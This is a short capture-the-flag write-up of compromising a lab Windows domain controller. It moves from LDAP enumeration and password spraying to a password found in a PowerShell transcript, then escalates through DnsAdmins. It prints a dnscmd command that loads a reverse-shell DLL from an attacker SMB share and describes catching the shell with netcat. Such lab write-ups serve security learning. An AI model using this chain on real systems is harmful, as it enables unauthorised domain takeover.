target is a classic DC, allows null auth but no SMB access, ldap null auth works and gives a lot of info
created a user list using ldap, found default creds with `impacket-samrdump`

![[Pasted image 20251026103728.png]]
it shows at marko but doesnt work, probably works for a different user
![[Pasted image 20251026103556.png]]

found that this password is working for the user `melanie` , used nxc for spraying
![[Pasted image 20251026103609.png]]

as melanie, found a PSTranscript file on the host.
`C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`
the PS Transcript reveals the password for ryan
![[Pasted image 20251026160923.png]]

ryan is a part of `dnsadmins`, and this role allows a user to execute `dnscmd.exe`  
there is a classic vector in the case of a compromised user in `dnsadmins`, blog post [here](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/) 
1. create a payload for revshell / change administrator password / anything that leads to escalation
![[Pasted image 20251026161249.png]]
2. host the malicious dll with smb, to avoid problems with defender.
![[Pasted image 20251026161347.png]]
3. use the `dnscmd` tool to specify the location of the dll, the location will be added to the registry and windows will attempt to load this DLL the next time DNS starts
`dnscmd.exe /config /serverlevelplugindll \\10.10.16.21\share\rev-4545.dll`
![[Pasted image 20251026161536.png]]
4. open nc listener
![[Pasted image 20251026161735.png]]
5. restart the dns service
![[Pasted image 20251026161825.png]]
6. payload should execute
![[Pasted image 20251026161945.png]]
